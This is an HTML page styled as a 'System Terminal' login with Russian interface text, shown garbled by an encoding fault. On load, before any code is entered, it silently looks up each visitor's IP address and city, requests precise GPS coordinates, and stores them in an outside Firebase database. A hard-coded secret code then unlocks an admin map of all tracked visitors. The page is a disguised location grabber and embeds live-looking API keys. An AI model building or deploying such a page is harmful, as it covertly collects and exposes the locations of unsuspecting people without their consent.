<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Global Admin Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        :root { --primary: #007bff; --bg: #0b0b0b; --card: #161616; --success: #00ff88; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; }
        
        /* –í—Ö–æ–¥ */
        #code-step { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        #status-info { font-size: 12px; color: #555; margin-top: 10px; }
        
        /* –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å */
        #result-step { display: none; flex-direction: column; height: 100vh; }
        .admin-header { padding: 15px; background: var(--card); border-bottom: 1px solid #333; display: flex; justify-content: space-between; font-weight: bold; }
        
        .layout { display: flex; flex-direction: column; flex: 1; min-height: 0; }
        #map-box { flex: 1; min-height: 250px; position: relative; border-bottom: 1px solid #333; }
        #map { position: absolute; inset: 0; }
        
        #logs { flex: 1.5; overflow-y: auto; background: #000; padding: 10px; }
        .log-item { background: var(--card); margin-bottom: 10px; padding: 15px; border-radius: 12px; border-left: 5px solid var(--primary); position: relative; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        button { background: var(--primary); color: #fff; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; }
        input { background: #222; border: 1px solid #444; color: #fff; padding: 15px; border-radius: 12px; width: 250px; text-align: center; margin-bottom: 10px; }
        .del-btn { position: absolute; right: 10px; top: 10px; background: #ff4444; border: none; color: #fff; padding: 5px 10px; border-radius: 5px; font-size: 10px; }
    </style>
</head>
<body>

    <div id="code-step">
        <h2 style="color:var(--primary)">System Terminal</h2>
        <input type="password" id="accessCode" placeholder="–°–ï–ö–†–ï–¢–ù–´–ô –ö–û–î">
        <button onclick="checkCode()">–í–û–ô–¢–ò</button>
        <div id="status-info">–û–∂–∏–¥–∞–Ω–∏–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏...</div>
    </div>

    <div id="result-step">
        <div class="admin-header">
            <span>DATABASE MONITOR</span>
            <span id="counter" style="color:var(--primary)">0 USERS</span>
        </div>
        <div class="layout">
            <div id="map-box"><div id="map"></div></div>
            <div id="logs">–°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º...</div>
        </div>
    </div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onValue, remove, update, serverTimestamp, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyBHk4tRKFbr8qIkzI2WDOaf-JBfVmjDdRI", 
        authDomain: "flutter-ai-playground-caf0d.firebaseapp.com", 
        projectId: "flutter-ai-playground-caf0d", 
        storageBucket: "flutter-ai-playground-caf0d.firebasestorage.app", 
        messagingSenderId: "155816311480", 
        appId: "1:155816311480:web:a0456fcc4681e62837924d",
        databaseURL: "https://cheatip-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const SECRET_CODE = "HTMLKODEYOURIP";
    let map, markers = {};

    // --- –°–ë–û–† –î–ê–ù–ù–´–• (–°–†–ê–ó–£) ---
    async function collect() {
        try {
            const status = document.getElementById('status-info');
            const res = await fetch('https://ipapi.co/json/');
            const ipData = await res.json();
            
            const visitRef = push(ref(db, 'visits'));
            const uid = visitRef.key;

            const baseData = {
                ip: ipData.ip || "Unknown",
                city: ipData.city || "Unknown",
                lat: ipData.latitude,
                lng: ipData.longitude,
                method: "IP",
                time: new Date().toLocaleString('ru-RU'),
                timestamp: serverTimestamp()
            };

            await update(ref(db, `visits/${uid}`), baseData);
            status.innerText = "–î–∞–Ω–Ω—ã–µ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞–Ω—ã (IP)";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await update(ref(db, `visits/${uid}`), {
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        method: "GPS"
                    });
                    status.innerText = "–î–∞–Ω–Ω—ã–µ —É—Ç–æ—á–Ω–µ–Ω—ã (GPS)";
                }, null, { enableHighAccuracy: true });
            }
        } catch (e) { console.error(e); }
    }
    collect();

    // --- –ê–î–ú–ò–ù–ö–ê ---
    window.checkCode = function() {
        if (document.getElementById('accessCode').value === SECRET_CODE) {
            document.getElementById('code-step').style.display = 'none';
            document.getElementById('result-step').style.display = 'flex';
            setTimeout(initMap, 300);
        } else { location.reload(); }
    }

    function initMap() {
        map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        loadData();
    }

    window.deleteItem = (e, k) => {
        e.stopPropagation();
        if(confirm("–£–¥–∞–ª–∏—Ç—å?")) remove(ref(db, `visits/${k}`));
    }

    function loadData() {
        // –°–ª—É—à–∞–µ–º –í–°–ï –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –ø–∞–ø–∫–µ 'visits'
        onValue(ref(db, 'visits'), (snap) => {
            const data = snap.val();
            const logBox = document.getElementById('logs');
            logBox.innerHTML = '';
            
            Object.values(markers).forEach(m => map.removeLayer(m));
            markers = {};

            if(!data) {
                logBox.innerHTML = "–ë–∞–∑–∞ –ø—É—Å—Ç–∞.";
                document.getElementById('counter').innerText = "0 USERS";
                return;
            }

            const entries = Object.entries(data);
            document.getElementById('counter').innerText = `${entries.length} USERS`;

            // –°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞: –Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É (–ø–æ timestamp)
            entries.sort((a, b) => b[1].timestamp - a[1].timestamp);

            entries.forEach(([key, user], i) => {
                const isGPS = user.method === "GPS";
                const div = document.createElement('div');
                div.className = 'log-item';
                div.innerHTML = `
                    <button class="del-btn" onclick="deleteItem(event, '${key}')">–£–¥–∞–ª–∏—Ç—å</button>
                    <span style="font-size:10px; color:${isGPS?'#00ff88':'#888'}">[${user.method}]</span>
                    <b style="color:var(--primary)">#${entries.length - i}</b><br>
                    <b>IP:</b> ${user.ip}<br>
                    <b>City:</b> ${user.city}<br>
                    <small style="color:#666">üìç ${user.lat.toFixed(5)}, ${user.lng.toFixed(5)}</small>
                `;
                div.onclick = () => map.flyTo([user.lat, user.lng], 15);
                logBox.appendChild(div);

                markers[key] = L.marker([user.lat, user.lng]).addTo(map).bindPopup(`User ${user.ip}`);
            });
        });
    }
</script>
</body>
</html>
